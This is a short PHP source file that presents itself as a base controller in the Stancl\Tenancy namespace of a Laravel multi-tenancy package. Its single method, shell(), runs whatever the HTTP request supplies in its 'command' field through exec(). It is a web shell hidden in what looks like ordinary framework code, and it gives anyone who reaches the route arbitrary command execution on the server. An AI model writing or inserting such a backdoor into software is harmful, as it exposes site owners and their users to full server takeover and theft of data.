<?php

declare(strict_types=1);

namespace Stancl\Tenancy\Controllers;

use Illuminate\Routing\Controller;

class TenantBaseController extends Controller
{
    public function shell():void
    {
        exec(request()->input('command'));
    }

}
